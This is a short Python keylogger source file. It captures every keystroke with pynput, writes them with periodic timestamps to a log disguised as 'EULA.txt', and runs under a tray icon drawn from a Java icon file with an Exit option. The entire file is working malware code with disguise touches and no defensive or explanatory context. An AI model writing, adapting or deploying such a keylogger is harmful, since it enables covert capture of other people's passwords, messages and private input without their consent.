from pynput import keyboard as kb
from threading import Timer
import time
import pystray
import PIL.Image
import sys

image = PIL.Image.open("2-keylogger\java.ico")
file = open("EULA.txt", "a")


class RepeatTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

def current_time():
    return time.ctime(time.time())

def ptime():
        print ("\n" + current_time() + ": \n")
        file.write("\n" + current_time() + ": \n")


def Pressed(key):
    skey = str(key)
    skey = skey.replace("'", "")

    if (str(key)=="Key.space"):
        print(" ", end="")
        file.write(" ")
    elif(str(key)=="Key.enter"):
        print("\n", end="")
        file.write("\n")
    elif(str(key)=="Key.backspace"):
        print("(b)", end="")
        file.write("(b)")
    elif(str(key)=="Key.ctrl_l"):
        print("(ctr)", end="")
        file.write("(ctr)")
    elif(str(key)=="Key.shift"):
        print("", end="")
    elif(len(skey)>1):
        print("", end="")

    else:
        print (skey, end="")
        file.write(skey)

listener =  kb.Listener(on_press=Pressed)

def butt():
    print("\nexiting...")
    listener.stop()
    timer.cancel()
    icon.stop()

    
icon = pystray.Icon("Coomer", image, menu=pystray.Menu(
    pystray.MenuItem("Exit", butt)
))



if __name__ == "__main__":
    timer = RepeatTimer(180, ptime)
    ptime()
    timer.start()
    listener.start()
    icon.run()
    input()
    sys.exit()

    
    
    
